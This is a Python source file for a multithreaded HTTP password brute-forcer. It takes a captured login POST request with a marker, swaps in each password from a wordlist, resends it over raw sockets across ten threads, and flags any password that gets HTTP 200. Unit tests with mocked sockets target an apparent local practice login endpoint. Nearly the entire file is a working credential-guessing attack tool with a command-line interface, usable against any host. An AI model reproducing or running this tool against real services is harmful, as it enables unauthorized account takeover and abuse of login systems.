#!/usr/bin/python
# -*- coding: utf8 -*-

import argparse
import logging
import re
import socket
import sys
import unittest
import threading
import time


logging.basicConfig(filename='debug.log', filemode='w', level=logging.DEBUG)

log = logging.getLogger('main')

console = logging.StreamHandler()
console.setLevel(logging.INFO)
log.addHandler(console) 



class Bruter():
    
    _SIGNATURE = r'**B**'
    
    def __init__(self, reqFile, passFile, _mockReqFile=None, _mockPassFile=None,
                 _mockResponseSock=None):
        
        
        self._mockResponseSock = _mockResponseSock
        
        log.debug("reading pwd file %s...", reqFile)
        
        if _mockReqFile:
            self._reqData = _mockReqFile(reqFile, 'r').read()
        else:
            self._reqData = open(reqFile, 'r').read()
        
        log.debug("reading req file %s...", reqFile)
        
        if _mockPassFile:
            self._passData = _mockPassFile(passFile, 'r').readlines()
        else:
            self._passData = open(passFile, 'r').readlines()
        
        self._passCount = len(self._passData)
        
        log.info("reqests: %s" % self._reqData)
        log.info("passwords count: %d" % self._passCount)
        log.debug("passwords: %s" % self._passData)
        
        self._reqFile = reqFile
        self._passFile = passFile
        
        if not self._SIGNATURE in self._reqData:
            raise RuntimeError("Please specify parameter to bruteforce with %s mark in file %s" % (
                               self._SIGNATURE,
                               self._reqFile))
        if not self._passCount:
            raise RuntimeError("There is no paswords in file %s" % self._passFile)
        
    def getNextPassword(self):
        
        assert(type(self._passData) == list)
        
        if self._passData:
        
            return self._passData.pop(0)
        
        else:
            
            return 0
    
    def getPasswordsCount(self):
        
        return self._passCount
            
    def parseRequest(self):
        
        port = 80
        host = ''
        
        m = re.search("Host: (.*?):(\d*)", self._reqData, re.DOTALL)
        if m:
            host = m.group(1)
            port = int(m.group(2))
            
            log.info("Found host:port - %s:%d" % (host, port))
        else:   
            m = re.search("Host: (.*?)", self._reqData, re.DOTALL)
            if m:
                
                log.info("Found host: %s, port = 80" % (host))
                host = m.group(1)
           
        if not host:
            raise RuntimeError("There is no Host in request file %s" %
                               self._reqFile)
       
        # only POST method for now is supported
        assert('POST' in self._reqData[0:4])
       
        
        self._requestParams = {"host": host,
                               "port": port}
        
    def fitPassword(self, data, password):
        
        password = str(password).strip()
        
        # fix data
        
        dataFixed = data.replace(self._SIGNATURE, password)
        
        # fix content length
        
        postData = dataFixed.split('\n\n')[1]
        l = len(postData)
        
        contentFixed = re.sub("Content-Length: \d+", "Content-Length: %d" % l, dataFixed, flags=re.DOTALL)
        
        log.debug("fixed data:\n%s" % contentFixed)
        
        return contentFixed        
        
        
    def doAtomRequest(self, password):

        log.debug("connecting...")
        
        if self._mockResponseSock:
            s = self._mockResponseSock(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        
        d = self.fitPassword(self._reqData, password)
        
        s.connect((self._requestParams['host'], self._requestParams['port'])) 
        s.send(d)

        data = s.recv(2048)
        
        log.debug("response:\n%s" % data)
        
        code = data[9:12]
        code = int(code)
        log.debug("result: %d" % code)
        
        # only 200 response code is allowed right now
        
        if code == 200:
            log.info("password found: %s" % password)
        
        return code;
        
        
    def brute(self):
        
        self.parseRequest()
        
        totalLen = len(self._passData)
        
        idx = 0
        results = {}
        
        for password in self._passData:
            
            r = self.doAtomRequest(password)
            
            if not results.has_key(r):
                results[r] = 1
            else:
                results[r] += 1
                
            idx += 1
            
            sys.stdout.write('%d/%d\r' % (idx, totalLen))
            sys.stdout.flush()
            
            
     
        log.info(results)
        
class BruterThread(threading.Thread):
    
    def __init__(self, bruter, id=0):
        threading.Thread.__init__(self)
        
        self._b = bruter
        
        self._id = id
        self._b.idx = 0
        
    def run(self):
        
        totalLen = self._b.getPasswordsCount()
        
        
        try:
            while True:
                
                password = self._b.getNextPassword()
                
                if not password:
                    break
                
                if self._b.is_stop:
                    break;
                            
                r = self._b.doAtomRequest(password)
                
                if not self._b.results.has_key(r):
                    self._b.results[r] = 1
                else:
                    self._b.results[r] += 1
                    
                self._b.idx += 1
                
                # sync
                
                self._b.lock.acquire()
                
                #sys.stdout.write('%d/%d\t%d:%s\r' % (idx, totalLen, self._id, password))
                sys.stdout.write('%d/%d        \r' % (self._b.idx, totalLen))
                sys.stdout.flush()
                
                log.debug('progress: %d/%d\t%d:%s\r' % (self._b.idx, totalLen, self._id, password))
                
                self._b.lock.release()
                
            log.debug("thread %d done" % self._id)
        except (KeyboardInterrupt, SystemExit):
            log.debug( '\n! Received keyboard interrupt, quitting threads.\n')
            sys.exit()
   
class testInit(unittest.TestCase):

    def runTest(self):
        
        if sys.version_info[0] == 3:     
            from unittest.mock import MagicMock
        else:
            from mock import MagicMock
        
        reqMock = MagicMock()
        passMock = MagicMock()
        
        testReqMockData = '''POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:30003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:3000/
Content-Type: application/json;charset=utf-8
Content-Length: 42
Cookie: continueCode=D4gRrQo8yX2ex3pqz9KLd1ZHEu8h3IESwH4uKtRGkON6wWVaBZMn5jbl17EP; io=_FZ38o2zC2kfAUIxAAZp
Connection: close

**B**'''
    
        readMock = MagicMock()
        attrs = {'read.return_value': testReqMockData}
        readMock.configure_mock(**attrs)
        
        attrs = {'return_value': readMock}
        reqMock.configure_mock(**attrs)
        
        testPassMockData = '''Password1
Password2'''
    
        readMock = MagicMock()
        attrs = {'readlines.return_value': testPassMockData.split('\n')}
        readMock.configure_mock(**attrs)
        
        attrs = {'return_value': readMock}
        passMock.configure_mock(**attrs)   
        
        b = Bruter(reqFile='Dummy0', passFile='Dummy1', 
                   _mockReqFile=reqMock, _mockPassFile=passMock)
        
        req = b.fitPassword(testReqMockData, 'Password2')
        
        storedRightReq = '''POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:30003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:3000/
Content-Type: application/json;charset=utf-8
Content-Length: 9
Cookie: continueCode=D4gRrQo8yX2ex3pqz9KLd1ZHEu8h3IESwH4uKtRGkON6wWVaBZMn5jbl17EP; io=_FZ38o2zC2kfAUIxAAZp
Connection: close

Password2'''
        self.assertEqual(req, storedRightReq)
    
        req = b.fitPassword(testReqMockData, '')
        
        storedRightReq = '''POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:30003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:3000/
Content-Type: application/json;charset=utf-8
Content-Length: 0
Cookie: continueCode=D4gRrQo8yX2ex3pqz9KLd1ZHEu8h3IESwH4uKtRGkON6wWVaBZMn5jbl17EP; io=_FZ38o2zC2kfAUIxAAZp
Connection: close

'''
        self.assertEqual(req, storedRightReq)
        

class testResponse(unittest.TestCase):
        
    def runTest(self):
        
        if sys.version_info[0] == 3:     
            from unittest.mock import MagicMock
        else:
            from mock import MagicMock

        reqMock = MagicMock()
        passMock = MagicMock()
        
        testReqMockData = '''POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:30003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:3000/
Content-Type: application/json;charset=utf-8
Content-Length: 42
Cookie: continueCode=D4gRrQo8yX2ex3pqz9KLd1ZHEu8h3IESwH4uKtRGkON6wWVaBZMn5jbl17EP; io=_FZ38o2zC2kfAUIxAAZp
Connection: close

**B**'''
    
        readMock = MagicMock()
        attrs = {'read.return_value': testReqMockData}
        readMock.configure_mock(**attrs)
        
        attrs = {'return_value': readMock}
        reqMock.configure_mock(**attrs)
        
        testPassMockData = '''Password'''
    
        readMock = MagicMock()
        attrs = {'readlines.return_value': testPassMockData.split('\n')}
        readMock.configure_mock(**attrs)
        
        attrs = {'return_value': readMock}
        passMock.configure_mock(**attrs)   
        
        testResponseMockData = '''HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=utf-8
Content-Length: 26
ETag: W/"1a-ARJvVK+smzAF3QQve2mDSG+3Eus"
Date: Wed, 21 Feb 2018 11:47:00 GMT
Connection: close

Invalid email or password.'''

        
        sockMock = MagicMock()
        
        attrs = {'recv.return_value': testResponseMockData}
        sockMock.configure_mock(**attrs)
        
        respMock = MagicMock()
        
        attrs = {'return_value': sockMock}
        respMock.configure_mock(**attrs)
        
        b = Bruter(reqFile='Dummy0', passFile='Dummy1', 
                   _mockReqFile=reqMock, _mockPassFile=passMock,
                   _mockResponseSock=respMock)
        
        b.parseRequest()
        
        code = b.doAtomRequest('')
    
        self.assertEqual(code, 401)
    
class testMulti(unittest.TestCase):
    
    def runTest(self):
        
        if sys.version_info[0] == 3:     
            from unittest.mock import MagicMock
        else:
            from mock import MagicMock

        reqMock = MagicMock()
        passMock = MagicMock()
        
        testReqMockData = '''POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:30003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:3000/
Content-Type: application/json;charset=utf-8
Content-Length: 42
Cookie: continueCode=D4gRrQo8yX2ex3pqz9KLd1ZHEu8h3IESwH4uKtRGkON6wWVaBZMn5jbl17EP; io=_FZ38o2zC2kfAUIxAAZp
Connection: close

**B**'''
    
        readMock = MagicMock()
        attrs = {'read.return_value': testReqMockData}
        readMock.configure_mock(**attrs)
        
        attrs = {'return_value': readMock}
        reqMock.configure_mock(**attrs)
        
        testPassMockData = '''Password
1
2
3
4
5
6
7
8
9'''
        
        log.info("**passwords**")
        log.info(testPassMockData.split('\n'))
    
        readMock = MagicMock()
        attrs = {'readlines.return_value': testPassMockData.split('\n')}
        readMock.configure_mock(**attrs)
        
        attrs = {'return_value': readMock}
        passMock.configure_mock(**attrs)   
        
        testResponseMockData = '''HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=utf-8
Content-Length: 26
ETag: W/"1a-ARJvVK+smzAF3QQve2mDSG+3Eus"
Date: Wed, 21 Feb 2018 11:47:00 GMT
Connection: close

Invalid email or password.'''

        
        sockMock = MagicMock()
        
        attrs = {'recv.return_value': testResponseMockData}
        sockMock.configure_mock(**attrs)
        
        respMock = MagicMock()
        
        attrs = {'return_value': sockMock}
        respMock.configure_mock(**attrs)
        
        br = Bruter(reqFile='Dummy0', passFile='Dummy1', 
                   _mockReqFile=reqMock, _mockPassFile=passMock,
                   _mockResponseSock=respMock)
                    
        log.debug("starting threads...")
        
        threads = []

        threadCount = 10
        
        br.lock = threading.Lock()
        br.parseRequest()
        br.results = {}
        
        for i in range(0, threadCount):
            
            log.debug("starting %d..." % i)
            
            t = BruterThread(br, id=i)
            t.start()
            threads.append(t)
    
        log.info("waiting threads...")
    
        for t in threads:
            t.join()
            
            
        log.info("threads done")
         
        self.assertEqual(sockMock.recv.call_count, threadCount)
        
        

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description=__name__)
            
    parser.add_argument('-r', '--request', dest='reqFile', action='store', help='Request txt file')
    parser.add_argument('-p', '--passwords', dest='passFile', action='store', help='Passwords list file')
    
    
    args = parser.parse_args()
    
    log.debug("%s %s" % (args.passFile, args.reqFile))
    
    if not args.passFile:
        log.error("-p parameter required")
        exit(-1)
        
    if not args.reqFile:
        log.error("-r parameter required")
        exit(-1)
    
    b = Bruter(reqFile=args.reqFile, passFile=args.passFile)

    threads = []

    threadCount = 10
    
    b.lock = threading.Lock()
    b.results = {}
    b.parseRequest()
    
    b.is_stop = False
    
    for i in range(0, threadCount):
        
        log.debug("starting %d..." % i)
        
        t = BruterThread(b, id=i)
        t.start()
        threads.append(t)
        
    log.info("waiting threads... (%d)" % len(threads))
    
    try:
        
        # non blocking wait, make CTRL-C work
    
        while True:
            
            isAlive = False
            
            time.sleep(3)
        
            for t in threads:
                if t.is_alive():
                    isAlive = True
                    
            if not isAlive:
                break
                                        
            
    except (KeyboardInterrupt, SystemExit):
        
        b.is_stop = True
        log.debug('Received keyboard interrupt, quitting threads')
        
        for t in threads:
            t.join()
            
    log.info("all threads done %s" % b.results)
     

    